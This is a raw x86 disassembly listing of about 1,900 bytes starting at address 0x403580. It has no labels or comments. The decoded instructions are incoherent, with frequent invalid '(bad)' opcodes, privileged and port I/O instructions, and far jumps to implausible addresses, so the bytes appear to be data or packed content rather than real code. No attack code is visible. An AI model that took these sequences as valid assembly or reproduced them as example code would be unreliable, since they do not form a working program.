  403580:	xor    ebx,DWORD PTR [edi]
  403582:	call   0x5f7:0x580954f6
  403589:	jae    0x4035a9
  40358b:	cmc    
  40358c:	cli    
  40358d:	(bad)  
  40358f:	hlt    
  403590:	xchg   edi,eax
  403591:	(bad)  
  403592:	xchg   ebx,eax
  403593:	icebp  
  403594:	mov    BYTE PTR [ecx+0x51],ah
  403597:	clc    
  403598:	jno    0x4035b5
  40359a:	pop    ss
  40359b:	repnz (bad) 
  40359d:	xor    eax,0xd48bfbd5
  4035a2:	loop   0x4035b0
  4035a4:	sub    eax,0x5e1d207a
  4035a9:	add    BYTE PTR [esi+0x1f],ah
  4035ac:	shl    DWORD PTR [esi],cl
  4035ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035af:	push   cs
  4035b0:	inc    eax
  4035b1:	cmp    al,0xeb
  4035b3:	or     esi,ecx
  4035b5:	adc    DWORD PTR [ecx],ebp
  4035b7:	loop   0x403592
  4035b9:	outs   dx,DWORD PTR ds:[si]
  4035bb:	add    BYTE PTR [eax],al
  4035bd:	add    BYTE PTR [eax],al
  4035bf:	add    al,bl
  4035c1:	(bad)  
  4035c2:	mov    ebp,0x102d1ad
  4035c7:	test   DWORD PTR [ebp+ebx*2+0x5c46aace],esp
  4035ce:	pop    ds
  4035cf:	push   ecx
  4035d0:	add    BYTE PTR [esi+0x28],bl
  4035d3:	test   ebx,0x82edad5f
  4035d9:	bound  edi,QWORD PTR [edx+0x43]
  4035dc:	scas   eax,DWORD PTR es:[edi]
  4035dd:	arpl   WORD PTR [ebx-0x47],ax
  4035e0:	jmp    0x23cf8246
  4035e5:	pusha  
  4035e6:	cmp    DWORD PTR [ebx],esi
  4035e8:	xor    DWORD PTR [edi+0x46],ebp
  4035eb:	sbb    eax,0x5f976e7b
  4035f0:	mov    ch,0x6c
  4035f2:	pusha  
  4035f3:	leave  
  4035f4:	imul   DWORD PTR [ebp+esi*8-0x26]
  4035f8:	sub    BYTE PTR [eax+0x2],dh
  4035fb:	jne    0x40357f
  4035fd:	jno    0x4035ca
  4035ff:	push   es
  403600:	mov    esp,0xee209473
  403605:	jno    0x403598
  403607:	loope  0x40364c
  403609:	jns    0x4035c9
  40360b:	dec    ebx
  40360c:	push   0xa6adef78
  403611:	jp     0x4035eb
  403613:	xchg   edi,eax
  403614:	in     al,0x7a
  403616:	cmp    eax,0x6a761b8a
  40361b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40361c:	xchg   ecx,eax
  40361d:	ja     0x403632
  40361f:	push   esi
  403620:	dec    edi
  403621:	jne    0x40361f
  403623:	out    dx,eax
  403624:	add    BYTE PTR [eax],al
  403626:	add    BYTE PTR [eax],al
  403628:	add    BYTE PTR [edx],cl
  40362a:	je     0x403615
  40362c:	add    esi,DWORD PTR [ebp+0x2]
  40362f:	inc    esp
  403630:	pop    ds
  403631:	adc    DWORD PTR [edx+0x62],edi
  403634:	retf   
  403635:	jl     0x40369f
  403637:	mov    edi,0x1e100866
  40363c:	(bad)  
  40363d:	push   edi
  40363e:	test   ebx,edi
  403640:	mov    bl,0xd3
  403642:	in     al,dx
  403643:	call   DWORD PTR [ebx+eax*2-0x618fdad7]
  40364a:	retf   
  40364b:	popf   
  40364c:	xchg   esi,eax
  40364d:	mov    ?,WORD PTR [eax-0x3b]
  403650:	jae    0x40368d
  403652:	or     bh,BYTE PTR [ebp+0xd]
  403655:	shl    DWORD PTR [esi+0x6f],1
  403658:	call   0x42173960
  40365d:	add    ecx,esp
  40365f:	dec    edx
  403660:	pushf  
  403661:	dec    esi
  403662:	sub    edx,esi
  403664:	mov    edx,0x17e0d39b
  403669:	mov    DWORD PTR [edi],ebx
  40366b:	pop    eax
  40366c:	xchg   BYTE PTR [ebx+0x46635019],ch
  403672:	pop    edi
  403673:	call   0xfa531a75
  403678:	fdivr  st,st(6)
  40367a:	inc    dx
  40367c:	xor    DWORD PTR [esi],esi
  40367e:	cmp    bh,bl
  403680:	mov    ebx,ss
  403682:	mov    ebx,0x307eaa67
  403687:	jne    0x403690
  403689:	pop    edx
  40368a:	(bad)  
  40368b:	int    0x99
  40368d:	add    BYTE PTR [eax],al
  40368f:	add    BYTE PTR [eax],al
  403691:	add    BYTE PTR [ebx+0x65],ah
  403694:	xchg   ebp,eax
  403695:	hlt    
  403696:	outs   dx,BYTE PTR ds:[esi]
  403697:	adc    DWORD PTR ds:0x3f5e9b12,ebp
  40369d:	outs   dx,DWORD PTR ds:[esi]
  40369e:	sbb    eax,DWORD PTR es:[edi+0x1ac3cece]
  4036a5:	stos   DWORD PTR es:[edi],eax
  4036a6:	sti    
  4036a7:	das    
  4036a8:	mov    ds:0xb0bdd645,al
  4036ad:	and    BYTE PTR [ebx+0x50270838],ah
  4036b3:	lock lahf 
  4036b5:	inc    edx
  4036b6:	rol    DWORD PTR [eax+ebx*1+0x9f7689c],0xb9
  4036be:	jns    0x40373b
  4036c0:	mov    dl,0x0
  4036c2:	and    eax,0xa02f4fb6
  4036c7:	dec    esi
  4036c8:	in     al,dx
  4036c9:	xchg   edi,eax
  4036ca:	mov    esi,0x1b85596e
  4036cf:	test   ebp,esp
  4036d1:	cmp    eax,0x658635dd
  4036d6:	sub    BYTE PTR [esi+0x3a],bl
  4036d9:	fld    QWORD PTR [esi+0x3d]
  4036dc:	(bad)  
  4036dd:	iret   
  4036de:	mov    bl,0xa7
  4036e0:	xor    dh,BYTE PTR [edi+0xa]
  4036e3:	push   cs
  4036e4:	in     al,0xea
  4036e6:	jmp    esp
  4036e8:	push   edi
  4036e9:	push   edx
  4036ea:	push   ecx
  4036eb:	xlat   BYTE PTR ds:[ebx]
  4036ec:	in     eax,dx
  4036ed:	inc    eax
  4036ee:	je     0x40371d
  4036f0:	push   ecx
  4036f1:	clc    
  4036f2:	in     eax,dx
  4036f3:	jne    0x403720
  4036f5:	lock add BYTE PTR [eax],al
  4036f8:	add    BYTE PTR [eax],al
  4036fa:	add    BYTE PTR [eax+0x7648978d],bl
  403700:	scas   al,BYTE PTR es:[edi]
  403701:	and    DWORD PTR [edx-0x1d],ebx
  403704:	inc    ebp
  403705:	sahf   
  403706:	loop   0x403782
  403708:	fisttp QWORD PTR [eax+0x7f]
  40370b:	iret   
  40370c:	push   es
  40370d:	cmc    
  40370e:	(bad)  
  40370f:	loope  0x403766
  403711:	inc    eax
  403712:	aad    0x44
  403714:	mov    edi,0xcee26dfc
  403719:	lahf   
  40371a:	xor    eax,0x8d232627
  40371f:	pop    ecx
  403720:	push   ss
  403721:	xchg   esi,eax
  403722:	lahf   
  403723:	lods   al,BYTE PTR ds:[esi]
  403724:	in     eax,dx
  403725:	sub    DWORD PTR [edi],esp
  403727:	adc    eax,0x70bafcf6
  40372c:	lahf   
  40372d:	inc    eax
  40372e:	add    cl,BYTE PTR [esi+0x7d]
  403731:	hlt    
  403732:	adc    bl,ch
  403734:	dec    ax
  403736:	test   al,0x91
  403738:	push   esi
  403739:	adc    al,0x9b
  40373b:	xor    al,0xad
  40373d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40373e:	and    esi,DWORD PTR [ebp-0x6d]
  403741:	xchg   ebx,eax
  403742:	sbb    eax,0xa1ac7884
  403747:	in     al,dx
  403748:	dec    esi
  403749:	lds    esi,FWORD PTR [esi-0x77]
  40374c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40374d:	imul   ecx,edx,0xffffffd9
  403750:	leave  
  403751:	cld    
  403752:	jle    0x403737
  403754:	sbb    al,0x23
  403756:	ret    
  403757:	jae    0x4037d0
  403759:	xor    esp,DWORD PTR [eax+0x1c0c4c33]
  40375f:	add    BYTE PTR [eax],al
  403761:	add    BYTE PTR [eax],al
  403763:	add    BYTE PTR [ebx-0x7656840f],dl
  403769:	(bad)  
  40376a:	aam    0x15
  40376c:	sub    DWORD PTR [esi],esp
  40376e:	pushf  
  40376f:	ret    0x7c44
  403772:	cmp    DWORD PTR [esi-0x24],0xffffffa9
  403776:	in     al,0xca
  403778:	fiadd  WORD PTR [esp+ecx*2]
  40377b:	ja     0x4037b3
  40377d:	jle    0x403783
  40377f:	or     eax,0xb12ae93e
  403784:	mov    BYTE PTR [edx],0xbd
  403787:	add    al,0xd4
  403789:	(bad)  
  40378a:	arpl   WORD PTR [eax+0x6f9aef1c],di
  403790:	mov    ecx,0x29d3b44b
  403795:	jp     0x4037ea
  403797:	adc    dx,bp
  40379a:	in     al,dx
  40379b:	fld    st(3)
  40379d:	jbe    0x40377b
  40379f:	mov    eax,0x543d383
  4037a4:	ret    
  4037a5:	loope  0x40374a
  4037a7:	mov    al,0xd9
  4037a9:	cmp    al,0x8b
  4037ab:	or     al,0x59
  4037ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037ae:	jae    0x40378b
  4037b0:	hlt    
  4037b1:	xor    ah,cl
  4037b3:	lods   al,BYTE PTR ds:[si]
  4037b5:	dec    edx
  4037b6:	cmp    edx,edx
  4037b8:	mov    ?,WORD PTR [edi+0x3066e13]
  4037be:	jmp    0xef94:0x46ed9bba
  4037c5:	test   DWORD PTR [ecx-0xd],esp
  4037c8:	add    BYTE PTR [eax],al
  4037ca:	add    BYTE PTR [eax],al
  4037cc:	add    BYTE PTR [ebx-0x19b3436d],dl
  4037d2:	fistp  DWORD PTR [esp]
  4037d5:	cmp    DWORD PTR [esi-0x8],esi
  4037d8:	or     ch,BYTE PTR [ebp+0x305c95fe]
  4037de:	adc    BYTE PTR [ebx-0x3d],dh
  4037e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037e2:	push   0xb0e7d395
  4037e7:	jo     0x403855
  4037e9:	pop    ebx
  4037ea:	dec    eax
  4037eb:	push   cs
  4037ec:	sbb    ebx,esi
  4037ee:	push   esi
  4037ef:	jmp    0x403824
  4037f1:	push   edx
  4037f2:	sahf   
  4037f3:	inc    edx
  4037f4:	cmp    al,0x65
  4037f6:	xor    ebx,DWORD PTR [edi-0x4644411d]
  4037fc:	sbb    DWORD PTR [ebp+ecx*8+0x14],0xffffffab
  403801:	mov    al,0x25
  403803:	test   DWORD PTR [edx+edx*4+0x1d],esp
  403807:	pusha  
  403808:	retf   
  403809:	not    ah
  40380b:	(bad)  
  40380c:	sbb    ecx,DWORD PTR [ebx-0x10fd243d]
  403812:	sub    dh,BYTE PTR [edx]
  403814:	sti    
  403815:	shl    DWORD PTR [esi+0x4e14548f],1
  40381b:	test   eax,0x440c9b2
  403820:	mov    WORD PTR ds:0xfe7b9ab8,cs
  403826:	pop    edi
  403827:	mul    DWORD PTR [edx+0x44111842]
  40382d:	test   DWORD PTR ds:0xeb6c,0x38000000
  403837:	outs   dx,BYTE PTR ds:[esi]
  403838:	int    0x12
  40383a:	fsubr  st(2),st
  40383c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40383d:	sub    eax,DWORD PTR [eax-0x75]
  403840:	add    BYTE PTR [esi-0x42],al
  403843:	mov    eax,ds:0x4e61238b
  403848:	xor    esp,DWORD PTR [edx]
  40384a:	dec    edi
  40384b:	dec    ebx
  40384c:	in     eax,dx
  40384d:	aas    
  40384e:	mov    al,ds:0x849955a6
  403853:	push   edx
  403854:	inc    edi
  403855:	mov    ah,0x69
  403857:	sahf   
  403858:	call   DWORD PTR [ebp-0x68]
  40385b:	jmp    0x4038be
  40385d:	lock cmp al,0x89
  403860:	fcmove st,st(6)
  403862:	add    esp,esi
  403864:	(bad)  
  403865:	imul   esi,esp,0x7f
  403868:	jo     0x403827
  40386a:	in     al,0x9e
  40386c:	sub    BYTE PTR [eax-0x27],bl
  40386f:	push   edx
  403870:	nop
  403871:	ss pop ds
  403873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403874:	adc    bl,0x81
  403877:	pop    eax
  403878:	cmp    ch,BYTE PTR [edx+0x71]
  40387b:	and    DWORD PTR [edi+0x1ef39487],0xd8939e1
  403885:	cld    
  403886:	int3   
  403887:	in     al,dx
  403888:	mov    ah,0x8d
  40388a:	sbb    DWORD PTR [ebx-0x43],eax
  40388d:	sub    ah,bh
  40388f:	scas   al,BYTE PTR es:[edi]
  403890:	add    eax,0x173b2006
  403895:	mov    ds:0x3aafb5b4,eax
  40389a:	add    BYTE PTR [eax],al
  40389c:	add    BYTE PTR [eax],al
  40389e:	add    BYTE PTR [esp+eiz*8+0x31],ch
  4038a2:	push   edi
  4038a3:	adc    DWORD PTR [eax-0x245b4e76],0x9829cc97
  4038ad:	and    BYTE PTR [edx-0x3087492f],dh
  4038b3:	xchg   esp,eax
  4038b4:	cmp    al,al
  4038b6:	sub    DWORD PTR [ecx-0x53],edi
  4038b9:	rol    BYTE PTR [esp+ecx*2+0x41],cl
  4038bd:	push   0x0
  4038bf:	fcom   DWORD PTR [ecx-0x6a]
  4038c2:	div    ebp
  4038c4:	sahf   
  4038c5:	sub    DWORD PTR [edi+0x43],ecx
  4038c8:	mov    DWORD PTR [edi+0x2373de5d],ebx
  4038ce:	in     eax,0xe1
  4038d0:	cld    
  4038d1:	push   0x4d
  4038d3:	cmp    al,0xf4
  4038d5:	(bad)  
  4038d6:	cmc    
  4038d7:	pop    edx
  4038d8:	shl    DWORD PTR [edx-0x19],cl
  4038db:	mov    bh,0x2c
  4038dd:	ficomp WORD PTR [edi-0x72]
  4038e0:	test   BYTE PTR [ecx],cl
  4038e2:	ret    0x8ca3
  4038e5:	mov    ch,0x7a
  4038e7:	add    eax,0x868003d
  4038ec:	mov    ds:0xb3e6d0bb,eax
  4038f1:	fimul  WORD PTR [eax+0x30634c1b]
  4038f7:	ins    DWORD PTR es:[edi],dx
  4038f8:	pop    ebx
  4038f9:	(bad)  
  4038fa:	and    dl,BYTE PTR [eax-0x4665956f]
  403900:	sbb    al,0xbd
  403902:	pop    es
  403903:	add    BYTE PTR [eax],al
  403905:	add    BYTE PTR [eax],al
  403907:	add    BYTE PTR [ebx+eax*8],dl
  40390a:	add    DWORD PTR [edi-0x524c1ede],edi
  403910:	jg     0x4038bd
  403912:	pop    es
  403913:	adc    eax,0x1d7243f6
  403918:	stos   DWORD PTR es:[edi],eax
  403919:	retf   
  40391a:	int    0xa5
  40391c:	cmp    eax,0x20b77b79
  403921:	fs (bad) 
  403923:	punpckhwd mm7,QWORD PTR [ebx+0x34049210]
  40392a:	lods   al,BYTE PTR ds:[esi]
  40392b:	sub    dl,dl
  40392d:	adc    ebx,DWORD PTR [ecx]
  40392f:	cmp    BYTE PTR [edi-0x14],ch
  403932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403933:	xor    cl,0xd8
  403936:	(bad)
  403939:	add    al,0x7a
  40393b:	pusha  
  40393c:	jne    0x403955
  40393e:	(bad)  
  40393f:	iret   
  403940:	xchg   DWORD PTR [ebx+edi*4],esi
  403943:	jae    0x403904
  403945:	mov    edx,0x6842a4b2
  40394a:	cdq    
  40394b:	sbb    dl,dl
  40394d:	inc    ecx
  40394e:	jmp    0x4038fc
  403950:	fmul   DWORD PTR [edx+edx*2]
  403953:	adc    DWORD PTR [eax],edi
  403955:	lahf   
  403956:	mov    eax,ds:0x7b3c434d
  40395b:	icebp  
  40395c:	mov    bl,0x25
  40395e:	jmp    0x4300d2a6
  403963:	clc    
  403964:	sbb    DWORD PTR [edx],ecx
  403966:	sub    ebp,DWORD PTR [edi]
  403968:	lods   al,BYTE PTR ds:[esi]
  403969:	mov    ah,0x11
  40396b:	xchg   ebx,eax
  40396c:	add    BYTE PTR [eax],al
  40396e:	add    BYTE PTR [eax],al
  403970:	add    BYTE PTR [ebx+edx*4],dh
  403973:	jb     0x40399b
  403975:	inc    esi
  403976:	and    cl,bl
  403978:	call   0x1cc6:0xf9c9919e
  40397f:	bound  eax,QWORD PTR [ebp+0x6e]
  403982:	sti    
  403983:	add    eax,esi
  403985:	pop    esp
  403986:	test   al,0x1a
  403988:	dec    esp
  403989:	adc    al,0x46
  40398b:	push   edx
  40398c:	fwait
  40398d:	test   eax,0xf926f960
  403992:	outs   dx,BYTE PTR ds:[esi]
  403993:	mov    dl,BYTE PTR [edx+0x2eb20c03]
  403999:	mov    ds:0x93546a82,eax
  40399e:	dec    edi
  40399f:	shr    eax,1
  4039a1:	jecxz  0x40394c
  4039a3:	xor    bl,BYTE PTR [ebp-0x17]
  4039a6:	aam    0x19
  4039a8:	loope  0x403a13
  4039aa:	cmc    
  4039ab:	loopne 0x4039e2
  4039ad:	fcom   QWORD PTR [eax+0x5e848a3a]
  4039b3:	test   eax,0x82fb763f
  4039b8:	or     esi,0x2
  4039bb:	lahf   
  4039bc:	xchg   edx,eax
  4039bd:	adc    eax,0xa1b9faa2
  4039c2:	dec    ecx
  4039c3:	adc    al,0x4a
  4039c5:	or     al,0x3c
  4039c7:	jno    0x4039ba
  4039c9:	dec    ecx
  4039ca:	mov    bl,0xc8
  4039cc:	or     edi,esi
  4039ce:	push   ds
  4039cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039d0:	and    ah,BYTE PTR [ebx+0xc143d6]
  4039d6:	add    BYTE PTR [eax],al
  4039d8:	add    BYTE PTR [eax],al
  4039da:	out    dx,al
  4039db:	les    ebx,FWORD PTR [esi]
  4039dd:	pop    edx
  4039de:	mov    ch,BYTE PTR [ecx+eiz*1]
  4039e1:	inc    ebp
  4039e2:	dec    edx
  4039e3:	aam    0x3c
  4039e5:	out    0xb7,al
  4039e7:	sbb    al,0x9a
  4039e9:	jge    0x403a2e
  4039eb:	cs mov bh,0x9e
  4039ee:	mov    edi,0x88d656c6
  4039f3:	dec    ebx
  4039f4:	repz je 0x4039cb
  4039f7:	mov    ds:0xb1810ecd,eax
  4039fc:	push   0xbe39dd2d
  403a01:	sbb    eax,0xfe5b11be
  403a06:	or     ebx,DWORD PTR [ecx+0x35]
  403a09:	gs mov bh,0x6b
  403a0c:	rol    ch,1
  403a0e:	repz add ebp,DWORD PTR [ecx-0x52]
  403a12:	sbb    al,0x8e
  403a14:	test   BYTE PTR [ebp-0xa1e1978],cl
  403a1a:	cli    
  403a1b:	repz (bad) 
  403a1d:	push   esp
  403a1e:	jno    0x403a9c
  403a20:	mov    ss,WORD PTR [esi]
  403a22:	rol    DWORD PTR [ebx+ebp*1+0x4ec1f35],cl
  403a29:	into   
  403a2a:	retf   0x9fde
  403a2d:	ins    BYTE PTR es:[edi],dx
  403a2e:	inc    esi
  403a2f:	xchg   esi,eax
  403a30:	cmp    DWORD PTR [ebp-0x59ac048f],eax
  403a36:	fnsave [edx+0x0]
  403a39:	mov    dl,0x59
  403a3b:	jmp    DWORD PTR [edx+0xcf]
  403a41:	add    BYTE PTR [eax],al
  403a43:	xor    BYTE PTR [edx+0x1b],dh
  403a46:	mov    cl,0x18
  403a48:	rol    DWORD PTR [ebx-0x34],cl
  403a4b:	mov    cl,0x1c
  403a4d:	sti    
  403a4e:	sub    al,bl
  403a50:	enter  0x47e9,0x8
  403a54:	and    eax,0x7249e651
  403a59:	int3   
  403a5a:	and    DWORD PTR [eax],0xfffffffe
  403a5d:	jae    0x403abc
  403a5f:	nop
  403a60:	imul   esp,DWORD PTR [esi-0x8],0x78
  403a64:	pop    es
  403a65:	fsubp  st(1),st
  403a67:	jbe    0x403a6b
  403a69:	add    BYTE PTR [esi+0x7a],dl
  403a6c:	repnz xchg ebp,eax
  403a6e:	(bad)  
  403a6f:	mov    eax,0xb1702c21
  403a74:	push   ecx
  403a75:	mov    edx,0x19c655ee
  403a7a:	cmp    DWORD PTR [edi-0x4a],edi
  403a7d:	pop    eax
  403a7f:	push   edi
  403a80:	addr16 xor eax,0xa3975a4f
  403a86:	idiv   DWORD PTR [edi-0x5adfcd87]
  403a8c:	imul   esp,DWORD PTR [ecx+ecx*4+0x761e9a9d],0xf088ca44
  403a97:	loopne 0x403ad7
  403a99:	sub    edi,edi
  403a9b:	jmp    0xcecef7ce
  403aa0:	fld    QWORD PTR [esi]
  403aa2:	pop    ecx
  403aa3:	jecxz  0x403ab2
  403aa5:	xchg   ecx,eax
  403aa6:	add    al,0x0
  403aa8:	add    BYTE PTR [eax],al
  403aaa:	add    BYTE PTR [eax],al
  403aac:	ret    0x6412
  403aaf:	rol    esi,cl
  403ab1:	loop   0x403aa4
  403ab3:	pop    edx
  403ab4:	leave  
  403ab5:	xor    DWORD PTR [eax+0x65],ecx
  403ab8:	mov    al,ds:0x1600de41
  403abd:	mov    edx,0xd3317dd4
  403ac2:	in     al,0xeb
  403ac4:	pop    eax
  403ac5:	shl    DWORD PTR [ebp-0x7a2f60af],cl
  403acb:	(bad)  
  403acc:	(bad)  
  403ace:	cwde   
  403acf:	push   esi
  403ad0:	clc    
  403ad1:	or     BYTE PTR [eax-0x71e9e40],ch
  403ad7:	jp     0x403b2f
  403ad9:	fcmove st,st(0)
  403adb:	in     al,dx
  403adc:	enter  0x5c06,0x4f
  403ae0:	out    dx,eax
  403ae1:	add    eax,0xade6d96c
  403ae6:	cmp    al,0x63
  403ae8:	xor    DWORD PTR [edi+0xc97f50c],esp
  403aee:	and    al,cl
  403af0:	nop
  403af1:	pop    es
  403af2:	adc    BYTE PTR [esi-0x7],bl
  403af5:	out    0x40,al
  403af7:	in     al,0xfe
  403af9:	in     eax,0x70
  403afb:	jb     0x403b6d
  403afd:	add    esp,esp
  403aff:	shl    DWORD PTR [edi-0x6],1
  403b02:	rol    DWORD PTR [edi-0x2],cl
  403b05:	stos   DWORD PTR es:[edi],eax
  403b06:	test   ch,bh
  403b08:	stc    
  403b09:	test   al,0xb4
  403b0b:	imul   ebp,DWORD PTR [ecx+0xfaa834],0x0
  403b12:	add    BYTE PTR [eax],al
  403b14:	add    BYTE PTR [esi+0x30],cl
  403b17:	cwde   
  403b18:	ins    BYTE PTR es:[edi],dx
  403b19:	(bad)  
  403b1a:	sbb    ecx,ecx
  403b1c:	(bad)  
  403b1d:	mov    al,0x32
  403b1f:	stc    
  403b20:	inc    eax
  403b21:	cs mov bh,0x6c
  403b24:	jecxz  0x403abf
  403b26:	mov    ebp,0xd400755c
  403b2b:	or     eax,0x3dcfb7cf
  403b30:	pop    ecx
  403b31:	jp     0x403aea
  403b33:	xor    BYTE PTR [ebp+edi*8+0x753a00bc],ch
  403b3a:	loope  0x403b10
  403b3c:	push   ecx
  403b3d:	cmc    
  403b3e:	jnp    0x403b14
  403b40:	popa   
  403b41:	cmp    edx,0x77
  403b44:	hlt    
  403b45:	call   0x5704abdc
  403b4a:	in     al,0x69
  403b4c:	xchg   ebp,eax
  403b4d:	in     al,dx
  403b4e:	xor    BYTE PTR [edi-0x5b],ch
  403b51:	jp     0x403b24
  403b53:	add    DWORD PTR [eax-0x77f9941d],edi
  403b59:	ins    DWORD PTR es:[edi],dx
  403b5a:	(bad)  
  403b5c:	fsub   DWORD PTR [edi]
  403b5e:	dec    edx
  403b5f:	stc    
  403b60:	call   0x7c5d0ff6
  403b65:	cli    
  403b66:	pusha  
  403b67:	sbb    ecx,DWORD PTR [esp+eax*4-0x26]
  403b6b:	and    bl,BYTE PTR ds:0x2d25f31e
  403b71:	mov    BYTE PTR [ebx-0x30],cl
  403b74:	inc    ecx
  403b75:	in     eax,0x99
  403b77:	enter  0x71,0x0
  403b7b:	add    BYTE PTR [eax],al
  403b7d:	add    BYTE PTR [ebx+0x31],dh
  403b80:	shl    DWORD PTR [eax],1
  403b82:	icebp  
  403b83:	imul   edx,esi,0x10
  403b86:	pop    edi
  403b87:	jmp    0xb575:0xa2ec8572
  403b8e:	jp     0x403be4
  403b90:	ins    BYTE PTR es:[edi],dx
  403b91:	in     al,0xd8
  403b93:	shr    BYTE PTR [ebx-0x2c],0x46
  403b97:	loope  0x403b9d
  403b99:	leave  
  403b9a:	xlat   BYTE PTR ds:[ebx]
  403b9b:	fwait
  403b9c:	add    edi,ecx
  403b9e:	inc    ecx
  403b9f:	sub    edi,edx
  403ba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ba2:	add    edi,DWORD PTR [ebx-0x3]
  403ba5:	xchg   edi,eax
  403ba6:	lea    eax,[eax]
  403ba8:	sbb    cl,BYTE PTR ds:0x3d1eb41e
  403bae:	mov    BYTE PTR [edx+0x27],cl
  403bb1:	ins    BYTE PTR es:[edi],dx
  403bb2:	jmp    0xd202:0x745c2081
  403bb9:	sbb    BYTE PTR [esi+ebp*4+0x24d41ffd],ah
  403bc0:	ins    BYTE PTR es:[edi],dx
  403bc1:	es gs retf 0x215b
  403bc6:	jne    0x403c00
  403bc8:	aad    0x5
  403bca:	or     BYTE PTR [eax+0x2dd002e2],bl
  403bd0:	imul   edi,ebx,0x6
  403bd3:	les    esi,FWORD PTR [esp+edi*8]
  403bd6:	ss push edx
  403bd8:	mov    WORD PTR [ebx+0x1c],?
  403bdb:	sar    ebx,0x74
  403bde:	or     al,0x53
  403be0:	bound  ebp,QWORD PTR [ebp+0x0]
  403be3:	add    BYTE PTR [eax],al
  403be5:	add    BYTE PTR [eax],al
  403be7:	sub    eax,0xfd6a0d9d
  403bec:	es mov ecx,esi
  403bef:	or     cl,0xd4
  403bf2:	leave  
  403bf3:	mov    BYTE PTR [ebx],bh
  403bf5:	rcl    BYTE PTR gs:[ecx-0x4b],1
  403bf9:	repnz (bad) 
  403bfb:	cmp    DWORD PTR [edi],ebx
  403bfd:	xor    al,0x76
  403bff:	push   esp
  403c00:	dec    edx
  403c01:	and    esi,DWORD PTR [ecx+0x24]
  403c04:	mov    eax,0x2e75688a
  403c09:	mov    ch,0x6f
  403c0b:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  403c0d:	xor    ecx,ebx
  403c0f:	fadd   DWORD PTR [ebx-0x4]
  403c12:	retf   
  403c13:	add    dl,dl
  403c15:	(bad)  
  403c16:	aad    0xb9
  403c18:	pop    ss
  403c19:	call   0x8c1d:0x2aad81d2
  403c20:	sbb    al,0xd5
  403c22:	sbb    DWORD PTR [esi+eiz*4+0x3ffd2344],ebx
  403c29:	mov    bl,0x24
  403c2b:	sub    eax,0x90002dd2
  403c30:	xor    eax,0x9f7806ba
  403c35:	add    BYTE PTR [ebx+0x53],al
  403c38:	cmp    eax,0x2d4c8c5f
  403c3d:	leave  
  403c3e:	mov    ecx,0x63c3375
  403c43:	jae    0x403c88
  403c45:	stos   BYTE PTR es:[edi],al
  403c46:	xchg   edi,eax
  403c47:	xor    bh,cl
  403c49:	mov    eax,cr0
  403c4c:	add    BYTE PTR [eax],al
  403c4e:	add    BYTE PTR [eax],al
  403c50:	sub    eax,0x7e9e8609
  403c55:	outs   dx,DWORD PTR ds:[esi]
  403c56:	and    eax,0xb37f7e09
  403c5b:	jo     0x403cb4
  403c5d:	into   
  403c5e:	or     DWORD PTR [edi],ebx
  403c60:	push   eax
  403c61:	sahf   
  403c62:	lahf   
  403c63:	(bad)  
  403c64:	sub    al,0xab
  403c66:	push   cs
  403c67:	shr    BYTE PTR [ecx],1
  403c69:	mov    ebx,0x89c95998
  403c6e:	and    ah,BYTE PTR [esi]
  403c70:	(bad)  
  403c71:	pop    ecx
  403c72:	mov    ah,0xa0
  403c74:	imul   esp,edi,0x16
  403c77:	iret   
  403c78:	dec    edx
  403c79:	test   DWORD PTR [eax+0x3b465c3e],0xad165b29
  403c83:	aam    0x4e
  403c85:	test   DWORD PTR [eax],esp
  403c87:	or     DWORD PTR [edi+0x75],0xffffffb6
  403c8b:	jmp    0xd420:0x550ca424
  403c92:	call   0xc05c:0x3940c5d3
  403c99:	xor    BYTE PTR [edi+0x14dfc3ed],ch
  403c9f:	cmp    bh,BYTE PTR [ebp+0x5b8a830f]
  403ca5:	std    
  403ca6:	adc    DWORD PTR [ebp+0x5a],esi
  403ca9:	in     eax,dx
  403caa:	and    esp,0xffffff8d
  403cad:	sbb    al,0x3e
  403caf:	adc    ecx,DWORD PTR [ebx+0xa84c]
  403cb5:	add    BYTE PTR [eax],al
  403cb7:	add    BYTE PTR [eax],al
  403cb9:	lock test eax,0xa6bf0bce
  403cbf:	(bad)  
  403cc0:	popf   
  403cc1:	push   esi
  403cc2:	add    al,0xae
  403cc4:	daa    
  403cc5:	pop    ecx
  403cc6:	add    eax,0xac9cb19e
  403ccb:	xchg   edx,eax
  403ccc:	inc    esp
  403ccd:	shr    DWORD PTR [ebx-0xd52d5e],cl
  403cd3:	icebp  
  403cd4:	push   0xfec20235
  403cd9:	arpl   bp,bx
  403cdb:	push   esi
  403cdc:	pop    ebp
  403cdd:	mov    edx,fs
  403cdf:	retfw  
  403ce1:	and    eax,0xca713610
  403ce6:	or     BYTE PTR [esi],al
  403ce8:	out    0x5a,eax
  403cea:	mov    bh,0x1b
  403cec:	jbe    0x403c73
  403cee:	shr    BYTE PTR [ebx],1
  403cf0:	loopne 0x403cde
  403cf2:	mov    ch,0x7a
  403cf4:	pop    edx
  403cf5:	repz mov edx,0x1675cc4a
  403cfb:	fild   QWORD PTR [edi+0x4a]
  403cfe:	sbb    edi,ebp
  403d00:	stc    
  403d01:	mov    bl,0x34
  403d03:	mov    esi,0x8e33fc43
  403d08:	aad    0x2
  403d0a:	aad    0xa3
  403d0c:	call   0x7ed410fe
  403d11:	test   BYTE PTR [esi-0x46743b3e],dh
  403d17:	repnz push edx
  403d19:	std    
  403d1a:	adc    eax,0xf167
  403d1f:	add    BYTE PTR [eax],al
  403d21:	add    dl,dh
  403d23:	sbb    dl,BYTE PTR [edi+0x67]
  403d26:	mov    ebx,DWORD PTR [eax]
  403d28:	push   es
  403d29:	fst    QWORD PTR [eax+esi*1+0x36]
  403d2d:	dec    ebx
  403d2e:	mov    ah,0xaf
  403d30:	sub    bl,dl
  403d32:	sub    ebp,DWORD PTR [eax-0x388ab3e6]
  403d38:	add    al,0x4a
  403d3a:	arpl   dx,bx
  403d3c:	(bad)  
